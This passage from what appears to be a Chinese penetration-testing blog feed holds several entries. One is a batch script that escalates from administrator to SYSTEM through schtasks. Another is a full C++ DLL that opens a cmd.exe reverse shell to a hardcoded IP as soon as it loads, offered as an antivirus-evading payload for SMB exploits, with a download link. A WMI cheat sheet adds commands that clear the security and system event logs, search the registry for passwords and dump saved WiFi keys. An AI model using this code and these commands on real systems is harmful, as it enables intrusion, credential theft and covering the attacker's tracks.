class="line">TIMEOUT /T <span class="number">1</span> &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="built_in">chcp</span> <span class="number">437</span>&gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span>&amp;&amp; schtasks.exe /query /tn runAsSystem /fo list| <span class="built_in">findstr</span> /i "Running"  &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span> &amp;&amp; (<span class="keyword">goto</span> :Running ) || ( <span class="keyword">goto</span> :Ready)</span><br><span class="line"><span class="keyword">goto</span> :EOF</span><br><span class="line"></span><br><span class="line">:EOF</span><br></pre></td></tr></table></figure><p>场景：<br>当前为本地administrator 本地帐号想查看域帐号信息(需域帐号权限或system帐号) 但当前<strong>shell</strong>非交互也无法反弹找了几款发现仅支持 <strong>Vista</strong>以下系统<strong>psexec</strong>倒是可以非交互下使用 但是目标系统执行出错,利用wmi也不行<br><code>nircmd.exe elevatecmd runassystem cmd.exe</code> 非交互环境下不行</p><p>所以利用schtasks命令写一个批处理来实现非交互环境下 administrator 转 system用户</p>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win下编译最新单文件nmap</title>
      <link href="/2017/06/04/windows-nmap/"/>
      <url>/2017/06/04/windows-nmap/</url>
      
        <content type="html"><![CDATA[<p>nmap 功能非常强大一直是广大安全测试人员最喜爱工具之一<br>渗透测试过程中很多时候目标环境不方便安装nmap 所以就需要编译一份单文件版nmap<br>支持低版本windows(winxp\win2003)<br>本人代码功底非常粗浅，所遇到问题大多通过google找到解决方案的写这篇文章目的是当作个人笔记，如果想喷请有建设性的喷，欢迎指出不足，或加以改良(剔除不必要的库和功能以减少体积)</p><p>运行截图:<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/1.PNG" alt></p><p>按照常规的方式静态编译 拿到第三方系统运行发现缺少openssl 相关库<br>查询原因原来是 openssl 库需要单独静态编译</p><p>静态编译openssl 请参考：<br><a href="http://www.jianshu.com/p/4522f17ce2ff" target="_blank" rel="noopener">http://www.jianshu.com/p/4522f17ce2ff</a><br><a href="http://seclists.org/nmap-dev/2011/q2/att-1090/ncat-portable-static.txt" target="_blank" rel="noopener">http://seclists.org/nmap-dev/2011/q2/att-1090/ncat-portable-static.txt</a></p><p>简要说明下：<br>在Windows环境下编译openssl需要perl支持，安装ActivePerl<br><a href="https://www.openssl.org/source/openssl-1.0.1f.tar.gz" target="_blank" rel="noopener">下载OpenSSL源码</a></p><p>我们用<strong>VS2013</strong>来作为编译工具，打开命令行，切换到bin目录，比如</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell&gt; <span class="built_in">cd</span> d:\Program Files (x86)\Microsoft Visual Studio <span class="number">12</span>.<span class="number">0</span>\VC\bin</span><br><span class="line">shell&gt; vcvars32.bat</span><br><span class="line">shell&gt; perl Configure --prefix=C:/OpenSSL VC-WIN32 no-asm  -no-shared</span><br><span class="line">shell&gt; ms\do_ms.bat</span><br><span class="line">shell&gt; nmake -f ms\nt.mak install</span><br></pre></td></tr></table></figure><p>此处：附上以静态编译好了的openssl静态库 免去安装编译环境的麻烦</p><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/OpenSSL.zip" target="_blank" rel="noopener">OpenSSL静态库下载</a></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/2.PNG" alt></p><p>配置包含目录及编译好的<strong>openssl</strong>库目录<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/3.PNG" alt></p><p>设置平台工具集 使编译的文件支持低版本windows<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/4.PNG" alt></p><p><strong>设置静态编译</strong></p><blockquote><p>说明：<br>多线程（MT） 与 多线程调试（MTd）貌似一样，都没有MSVCP和MSVCR函数导入，只有Kernel32.dll。同时观察这两个文件的体积，都比MD或MDd大了很多，这正是它们不需要导入运行时库DLL函数的原因，因为它们把运行时库静态编译到自己的文件中去了。这也代表着它们运行的时候不会再依赖外部的运行时库DLL文件。</p></blockquote><p><a href="https://www.zhihu.com/question/25415940" target="_blank" rel="noopener">来源</a></p><p><strong>这里编译会遇到几个坑：</strong></p><p><strong>第一个坑：</strong><br>报错：</p><blockquote><p>1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol <strong>imp</strong>GetUserObjectInformationW@20 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol <strong>imp</strong>GetProcessWindowStation@0 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol <strong>imp</strong>GetDesktopWindow@0 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol <strong>imp</strong>MessageBoxA@16 referenced in function _OPENSSL_showfatal</p></blockquote><p>解决办法<br>附加依赖项添加<br><strong>user32.lib</strong><br><strong>gdi32.lib</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/5.PNG" alt></p><p><a href="http://seclists.org/nmap-dev/2011/q2/att-1090/ncat-portable-static.txt" target="_blank" rel="noopener">参考来源</a></p><p><strong>第二个坑</strong></p><p>选release编译，在链接的时候出问题了：</p><blockquote><p>7&gt;LIBCMT.lib(crt0init.obj) : warning LNK4098: 默认库“libcmtd.lib”与其他库的使用冲突；请使用 /NODEFAULTLIB:library<br>7&gt;LIBCMT.lib(crt0init.obj) : warning LNK4098: 默认库“msvcrt.lib”与其他库的使用冲突；请使用 /NODEFAULTLIB:library</p></blockquote><p>解决办法：</p><p>在项目连接器里面忽略两个lib就可以过了<br><strong>libcmtd.lib</strong> 和 <strong>libcmt.lib</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/6.PNG" alt></p><p><strong>第三个坑：</strong></p><blockquote><p>Error lnk2026: module unsafe for safeseh image</p></blockquote><p>解决办法：</p><p><strong>stackoverflow</strong> 上找到解决办法</p><blockquote><p>Right-click on your project -&gt;<br>Properties -&gt;<br>Configuration Properties -&gt;<br>Linker -&gt;<br>Advanced and changed “Image Has Safe Exception Handlers” to “No (/SAFESEH:NO)”</p></blockquote><p>对应中文版配置如下：<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/7.PNG" alt></p><p>解决方法二：</p><blockquote><p>在项目的“属性页”中找到“链接器”标签，然后点击“命令行”将/SAFESEH:NO添加到“附加选项”的框中，点击应用即可。</p></blockquote><p>原始单文件nmap 下载：<br><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/nmap.zip" target="_blank" rel="noopener">nmap原始单文件</a><br>大小:  2.25 MB<br>MD5: a7628eb98bc1b705fb3099c2c6857e02</p><p>nmap 剔除openssl lua  win7 测试通过</p><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/nmap_mt_upx.zip" target="_blank" rel="noopener">nmap瘦身版</a><br>大小: 486 KB<br>MD5: b518dba54aac5caa3ee29647411212dd</p><p><strong>已知问题：</strong><br>win2k3\winxp 报错：<br>在winxp 或win2k3 下编译 即可解决<br>由于没有winxp 开发环境，并未解决，期待大家来解决<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/nmap/8.PNG" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dll nc 反弹代码</title>
      <link href="/2017/04/18/netcat-dll/"/>
      <url>/2017/04/18/netcat-dll/</url>
      
        <content type="html"><![CDATA[<p>最近方程式smb 溢出很火 很多同学喜欢用<strong>metasploit</strong> 生成<strong>dll</strong>反弹很容易被杀<br>根据<a href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/23083.zip" target="_blank" rel="noopener">反弹代码</a>改写了一个 dll反弹版<br>无编译环境的可以二进制修改<strong>ip</strong>和端口字符串。</p><p><strong>gcc编译：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/27a6ce97f333342ffdb47badb4b20030.png" alt="2019-07-20-17-21-21"></p><p><strong>运行效果：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/a11debfd95e864fef458e253dc7f54e6.png" alt="2019-07-19-03-11-05"></p><p>使用<strong>Visual Studio 2013</strong> 编译注意事项：</p><ol><li>设置不使用预编译头或在代码中引入 <strong>stdafx.h</strong></li><li><strong>win2003</strong>及<strong>win2008</strong> 请使用在静态库中使用MFC方式</li><li>64位系统使用请编译为64位版本</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOCKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (dwReason)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">                reverse_shell();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        LPCSTR szMyUniqueNamedEvent = <span class="string">"sysnullevt"</span>;</span><br><span class="line">        HANDLE m_hEvent = CreateEventA(<span class="literal">NULL</span>, TRUE, FALSE, szMyUniqueNamedEvent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (GetLastError())</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">// app is already running</span></span><br><span class="line">        <span class="keyword">case</span> ERROR_ALREADY_EXISTS:</span><br><span class="line">        &#123;</span><br><span class="line">         CloseHandle(m_hEvent);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> ERROR_SUCCESS:</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        hax.sin_family = AF_INET;</span><br><span class="line">        hax.sin_port = htons(atoi(<span class="string">"443"</span>));</span><br><span class="line"></span><br><span class="line">        hax.sin_addr.s_addr = inet_addr(<span class="string">"172.31.139.141"</span>);</span><br><span class="line">        WSAConnect(Winsock, (SOCKADDR*)&amp;hax, <span class="keyword">sizeof</span>(hax), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;ini_processo, <span class="number">0</span>, <span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">        ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">        ini_processo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line"></span><br><span class="line">        CreateProcessA(<span class="literal">NULL</span>, <span class="string">"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;ini_processo, &amp;processo_info);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/hehe.zip" target="_blank" rel="noopener">dll下载</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>wmi一些操作</title>
      <link href="/2017/01/06/windows-commandline-tips/"/>
      <url>/2017/01/06/windows-commandline-tips/</url>
      
        <content type="html"><![CDATA[<p><strong>使用wmic识别安装到系统中的补丁情况</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">qfe</span> <span class="title">get</span> <span class="title">description</span>,<span class="title">installedOn</span></span></span><br></pre></td></tr></table></figure><p><strong>外部调用获取补丁情况</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from Win32_QuickFixEngineering</span><br><span class="line">SELECT * FROM Win32_OperatingSystemQFE</span><br></pre></td></tr></table></figure><p><strong>识别正在运行的服务</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">sc</span> <span class="title">query</span> <span class="title">type</span>= <span class="title">service</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt;<span class="title">net</span> <span class="title">start</span></span></span><br></pre></td></tr></table></figure><p><strong>识别开机启动的程序，包括路径</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">wmic</span> <span class="title">startup</span> <span class="title">list</span> <span class="title">full</span></span></span><br></pre></td></tr></table></figure><p><strong>查看系统中网卡的IP地址和MAC地址</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">nicconfig</span> <span class="title">get</span> <span class="title">ipaddress</span>,<span class="title">macaddress</span></span></span><br></pre></td></tr></table></figure><p><strong>用户列表</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">list</span> <span class="title">brief</span></span></span><br></pre></td></tr></table></figure><p><strong>查看当前系统是否有屏保保护，延迟是多少</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">desktop</span> <span class="title">get</span> <span class="title">screensaversecure</span>,<span class="title">screensavertimeout</span></span></span><br></pre></td></tr></table></figure><p><strong>域控机器</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">ntdomain</span> <span class="title">list</span> <span class="title">brief</span></span></span><br></pre></td></tr></table></figure><p><strong>登录用户</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">logon</span> <span class="title">list</span> <span class="title">brief</span></span></span><br></pre></td></tr></table></figure><p><strong>查看系统中开放的共享</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">share</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">path</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">net</span> <span class="title">share</span></span></span><br></pre></td></tr></table></figure><p><strong>卸载和重新安装程序</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product where &quot;name like &apos;%Office%&apos;&quot; get name</span><br><span class="line">wmic product where name=&quot;Office&quot; call uninstall</span><br></pre></td></tr></table></figure><p><a href="https://uknowsec.cn/posts/notes/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-WMI.html" target="_blank" rel="noopener">来源:</a><br><strong>查看系统中开启的日志</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">wmic</span> <span class="title">nteventlog</span> <span class="title">get</span> <span class="title">path</span>,<span class="title">filename</span>,<span class="title">writeable</span></span></span><br></pre></td></tr></table></figure><p><strong>清除相关的日志（这里是全部清除）</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl "windows powershell"</span><br><span class="line">wevtutil cl "security"</span><br><span class="line">wevtutil cl "system"</span><br></pre></td></tr></table></figure><p><em>博主注:建议使用tr 或sed 或其他方法替换关键字符<br>*</em>查看系统中安装的软件以及版本**</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">wmic</span> <span class="title">product</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">version</span></span></span><br></pre></td></tr></table></figure><p><strong>查看某个进程的详细信息 （路径，命令行参数等）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;wmic process where name=&quot;chrome.exe&quot; list full</span><br></pre></td></tr></table></figure><p><strong>终止一个进程</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">wmic</span> <span class="title">process</span> <span class="title">where</span> <span class="title">name</span>="<span class="title">xshell.exe</span>" <span class="title">call</span> <span class="title">terminate</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">ntsd</span> -<span class="title">c</span> <span class="title">q</span> -<span class="title">p</span> 进程的<span class="title">PID</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">taskkill</span> -<span class="title">im</span> <span class="title">pid</span></span></span><br></pre></td></tr></table></figure><p><strong>获取存储在注册表中所有包含密码的键值：</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKCU  /v "pwd" /s  #pwd可替换为password \ HKCU 可替换为HKCR</span><br></pre></td></tr></table></figure><p><strong>显示系统中的曾经连接过的无线密码</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profiles</span> </span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profiles</span> <span class="title">name</span>="<span class="title">profiles</span>的名字" <span class="title">key</span>=<span class="title">clear</span></span></span><br></pre></td></tr></table></figure><p><strong>博主首发:</strong><br>一键获取:</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "skip=<span class="number">9</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims=:" %i <span class="keyword">in</span> ('netsh wlan show profiles') <span class="keyword">do</span> @<span class="built_in">echo</span> %j | <span class="built_in">findstr</span> -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure><p><strong>查看当前系统是否是VMWARE</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">wmic</span> <span class="title">bios</span> <span class="title">list</span> <span class="title">full</span> | <span class="title">find</span> /<span class="title">i</span> "<span class="title">vmware</span>"</span></span><br></pre></td></tr></table></figure><p><strong>获取进程服务名称 PID</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | <span class="built_in">findstr</span> "TermService" </span><br><span class="line">netstat -ano | <span class="built_in">findstr</span> "PID"</span><br></pre></td></tr></table></figure><p><strong>杀毒软件</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure><p><strong>虚拟机检测</strong></p><ol><li><p>判断TotalPhysicalMemory和NumberOfLogicalProcessors</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$VMDetected</span> = <span class="literal">$False</span></span><br><span class="line"><span class="variable">$Arguments</span> = @&#123;</span><br><span class="line"> Class = <span class="string">'Win32_ComputerSystem'</span></span><br><span class="line"> <span class="keyword">Filter</span> = <span class="string">'NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Get-WmiObject</span> @Arguments) &#123; </span><br><span class="line"><span class="variable">$VMDetected</span> = <span class="literal">$True</span></span><br><span class="line"><span class="string">"In vm"</span></span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="string">"Not in vm"</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>判断虚拟机进程</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$VMwareDetected</span> = <span class="literal">$False</span></span><br><span class="line"><span class="variable">$VMAdapter</span> = <span class="built_in">Get-WmiObject</span> Win32_NetworkAdapter -Filter <span class="string">'Manufacturer LIKE</span></span><br><span class="line"><span class="string">"%VMware%" OR Name LIKE "%VMware%"'</span></span><br><span class="line"><span class="variable">$VMBios</span> = <span class="built_in">Get-WmiObject</span> Win32_BIOS -Filter <span class="string">'SerialNumber LIKE "%VMware%"'</span></span><br><span class="line"><span class="variable">$VMToolsRunning</span> = <span class="built_in">Get-WmiObject</span> Win32_Process -Filter <span class="string">'Name="vmtoolsd.exe"'</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$VMAdapter</span> -or <span class="variable">$VMBios</span> -or <span class="variable">$VMToolsRunning</span>) </span><br><span class="line">&#123; <span class="variable">$VMwareDetected</span> = <span class="literal">$True</span> </span><br><span class="line"><span class="string">"in vm"</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"not in vm"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://uknowsec.cn/posts/notes/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-WMI.html" target="_blank" rel="noopener">来源:权限维持-WMI</a></p><p><strong>获取电脑产品编号和型号信息</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic baseboard get Product,SerialNumber</span><br><span class="line">wmic bios get serialnumber</span><br></pre></td></tr></table></figure><p><strong>安装软件</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">wmic product list brief</span><br></pre></td></tr></table></figure><p><strong>程序运行时间</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get CreationDate</span><br></pre></td></tr></table></figure><p><strong>检查服务路径中包含空格且没有双引号的服务</strong><br>*博主首发</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service where   "((state='running') and  (pathname like '% %') and <span class="keyword">not</span> (pathname like '<span class="variable">%\"%</span>') and <span class="keyword">not</span> (pathname like '<span class="variable">%system32%</span>') and <span class="keyword">not</span> (pathname like '<span class="variable">%syswow64%</span>'))"  get pathname,name,displayname,startname</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全局抓取iphone 手机数据包</title>
      <link href="/2016/10/19/iphone-network/"/>
      <url>/2016/10/19/iphone-network/</url>
      
